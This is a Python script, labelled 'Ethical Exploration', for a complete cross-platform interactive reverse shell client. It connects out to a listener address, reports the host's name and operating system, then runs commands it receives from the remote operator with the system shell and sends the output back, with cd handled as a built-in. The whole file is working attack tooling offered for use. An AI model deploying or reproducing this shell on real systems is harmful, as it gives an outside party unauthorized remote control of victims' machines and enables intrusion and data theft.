#!/usr/bin/env python3
"""
Ethical Exploration - Interactive Cross-Platform Reverse Shell
License: GNU General Public License v3.0 (GPL-3.0)
Description: Bidirectional interactive reverse shell client supporting directory navigation,
             environment variables, error stream capture, and command execution across Linux, Windows, and macOS.
"""

import argparse
import os
import platform
import socket
import subprocess
import sys


def reverse_shell(ip, port, timeout=30):
    """Establishes reverse TCP shell back to listening handler."""
    print(f"[*] Attempting reverse shell connection to {ip}:{port}...")

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        sock.connect((ip, int(port)))
        print(f"[+] Connected to {ip}:{port}!")
    except Exception as e:
        print(f"[!] Connection failed: {e}", file=sys.stderr)
        sock.close()
        return

    # Banner message sent to listener
    system_info = f"[+] Shell session established from {platform.node()} ({platform.system()} {platform.release()})\n"
    sock.sendall(system_info.encode("utf-8"))

    while True:
        try:
            # Send prompt with current working directory
            cwd = os.getcwd()
            prompt = f"\n{cwd} > "
            sock.sendall(prompt.encode("utf-8"))

            # Receive command from operator
            data = sock.recv(4096)
            if not data:
                print("[-] Connection closed by remote operator.")
                break

            cmd = data.decode("utf-8", errors="ignore").strip()
            if not cmd:
                continue

            # Handle built-in termination
            if cmd.lower() in ("exit", "quit", "die"):
                sock.sendall(b"Session terminated by operator.\n")
                break

            # Handle directory changing (cd)
            if cmd.startswith("cd ") or cmd == "cd":
                target_dir = cmd[3:].strip() if len(cmd) > 2 else os.path.expanduser("~")
                try:
                    os.chdir(target_dir)
                    output_bytes = f"[+] Changed directory to: {os.getcwd()}\n".encode("utf-8")
                except Exception as dir_err:
                    output_bytes = f"[!] cd error: {dir_err}\n".encode("utf-8")
                sock.sendall(output_bytes)
                continue

            # Execute command in shell
            proc = subprocess.run(
                cmd,
                shell=True,
                capture_output=True,
                text=False
            )

            output = proc.stdout + proc.stderr
            if not output:
                output = b"[+] Command executed with no output.\n"

            sock.sendall(output)

        except (socket.error, ConnectionResetError, BrokenPipeError):
            print("[-] Connection interrupted.", file=sys.stderr)
            break
        except Exception as err:
            try:
                sock.sendall(f"[!] Execution error: {err}\n".encode("utf-8"))
            except Exception:
                break

    sock.close()
    print("[*] Reverse shell finished.")


def main():
    parser = argparse.ArgumentParser(
        description="Ethical Exploration - Interactive Reverse Shell Client",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""Examples:
  python3 ReverseShell.py -i 127.0.0.1 -p 4444
  python3 ReverseShell.py --ip 192.168.1.50 --port 9001
"""
    )
    parser.add_argument("-i", "--ip", default="127.0.0.1", help="Listener IP address (default: 127.0.0.1)")
    parser.add_argument("-p", "--port", type=int, default=4444, help="Listener port (default: 4444)")

    args = parser.parse_args()
    reverse_shell(args.ip, args.port)


if __name__ == "__main__":
    main()
